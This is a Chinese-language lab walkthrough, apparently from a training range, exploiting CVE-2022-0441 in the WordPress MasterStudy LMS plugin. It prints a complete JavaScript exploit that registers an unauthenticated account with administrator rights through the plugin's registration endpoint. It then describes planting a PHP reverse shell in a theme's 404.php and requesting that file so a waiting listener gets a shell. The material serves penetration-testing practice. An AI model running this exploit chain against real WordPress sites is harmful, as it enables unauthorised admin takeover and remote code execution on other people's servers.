> https://yunjing.ichunqiu.com/cve/detail/747
> #Unauthenticated-Account-Creation #Wordpress 

> Wordpress MasterStudy LMS插件任意用户添加
> https://nvd.nist.gov/vuln/detail/cve-2022-0441
> https://wpscan.com/vulnerability/173c2efe-ee9c-4539-852f-c242b4f728ed

正常访问：
![[Pasted image 20230117100229.png]]

直接使用网上的Javascript一键式exp [numanturle/Exploit.js](https://gist.github.com/numanturle/4762b497d3b56f1a399ea69aa02522a6)：
```javascript
function randomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

jQuery(document).ready(function($){
	username = "poctesting"+randomInt(1,1337);
	password_poc = "S3cr3t"+randomInt(1,1337);
	nonce = stm_lms_nonces.stm_lms_register

	post_data = {
		"user_login":username,
		"user_email":username+"@"+window.location.host,
		"user_password":password_poc,
		"user_password_re":password_poc,
		"become_instructor":"",
		"privacy_policy":true,
		"degree":"",
		"expertize":"",
		"auditory":"",
		"additional":[],
		"additional_instructors":[],
		"profile_default_fields_for_register":{
			"wp_capabilities":{
				"value":{
					"administrator":1
				}
			}
		}
	}
	
$.ajax({
    type: "POST",
    url: stm_lms_ajaxurl+"?action=stm_lms_register&nonce="+nonce,
    data: JSON.stringify(post_data),
    contentType: "application/json; charset=utf-8",
    dataType: "json",
    success: function(data){
		if(data.status == "success"){
			//window.location.href = "wp-admin/"
			console.log('%cRegistration Successful', 'color: black; background: yellow; font-size: 30px');
			console.log("Username : " + username);
			console.log("Password : " + password_poc);
		}
	},
    error: function(errMsg) {
        console.log(errMsg);
    }
});

});
```

直接在控制台运行脚本，得到Admin级别的新账户：
![[Pasted image 20230117103146.png]]

之后Cookie也自动更新了，可以直接进入仪表盘。进入仪表盘后，直接更改主题文件（推荐更改Wordpress自带主题）：
![[Pasted image 20230117104218.png]]

上文所使用的php-reverse-shell，参考自：
- [php-reverse-shell By pentestmonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
- [WordPress: Reverse Shell](https://www.hackingarticles.in/wordpress-reverse-shell/)
然后直接访问：
```url
http://eci-2ze14boo207kngnhg90n.cloudeci1.ichunqiu.com/wp-content/themes/twentyseventeen/404.php
```
提前设置好的侦听器就能收到回连的shell了：
![[Pasted image 20230117104452.png]]